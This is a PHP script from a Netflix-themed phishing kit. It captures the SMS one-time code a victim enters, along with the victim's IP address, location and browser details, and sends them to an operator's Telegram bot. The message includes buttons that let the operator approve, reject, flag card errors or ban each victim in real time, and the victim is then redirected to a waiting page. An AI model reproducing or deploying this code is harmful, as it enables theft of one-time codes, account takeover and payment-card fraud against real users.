<?php

session_start();

include ("panel.php");
include ("config.php");

// Get form data
$otp = $_POST['otp'];

// Construct the message with BIN and brand information
$message = '
     📺 | ▶️  𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐑𝐙𝐋𝐓𝐒  ▶️ | 📺

    ☛  💲  ☚  𝐒𝐌𝐒  ☛  💲  ☚

📲 𝑺𝑴𝑺 : ' . $otp . '

[🔋] 𝐓𝐢𝐞𝐫𝐬 [🔋]

📡 Adresse Ip : ' . $_SERVER['REMOTE_ADDR'] . '
🌐 City : ' . $city . '
🌐 Country : ' . $country . '
🤖 User-agent : ' . $_SERVER['HTTP_USER_AGENT'] . '
';


$error = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/smsfunctions/redirect.php?type=error&ip=' . urlencode(_ip()) . '&id=' . $randomId;
$success = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/smsfunctions/redirect.php?type=success&ip=' . urlencode(_ip()) . '&id=' . $randomId;
$app = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/smsfunctions/redirect.php?type=app&ip=' . urlencode(_ip()) . '&id=' . $randomId;
$carderror = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/smsfunctions/redirect.php?type=carderror&ip=' . urlencode(_ip()) . '&id=' . $randomId;
$banip = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/banip/banip.php?type=blocked&ip=' . urlencode(_ip()) . '&id=' . $randomId;



// Define the inline keyboard markup
$inlineKeyboard = [
    [
        ["text" => "𝐑𝐞𝐟𝐮𝐬𝐞 ❌", "url" => $error],
        ["text" => "𝐀𝐩𝐩𝐫𝐨𝐯𝐞 ✅", "url" => $success],

    ],
    [
        ["text" => "𝐀𝐩𝐩 🏦", "url" => $app],
    ],
    
    [
        ["text" => "𝐂𝐂 𝐄𝐫𝐫𝐨𝐫 💳 ❌", "url" => $carderror],
    ],
    
    [
        ["text" => "𝐁𝐚𝐧 𝐁𝐚𝐧 🚫 ", "url" => $banip],
    ],
];

// Convert the inline keyboard array to JSON
$keyboardMarkup = json_encode(["inline_keyboard" => $inlineKeyboard]);

// Manually create the reply_markup string
$replyMarkup = "&reply_markup=" . urlencode($keyboardMarkup);

// Construct the message with the updated reply_markup
$telegramMessage = "$message$replyMarkup";

$telegramUrl = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($message).'&parse_mode=HTML'.$replyMarkup;

$html = file_get_contents($telegramUrl);

if ($html === false) {
    // Error handling: Telegram message was not sent
    echo "404 Not Found.";
} else {
    // Success handling: Telegram message sent
    // Redirect to card.php
    header("Location: ../waitingsms.php?userid={$randString}&ue={$randString}");
    exit; // Ensure that the script stops executing after the redirection
}
?>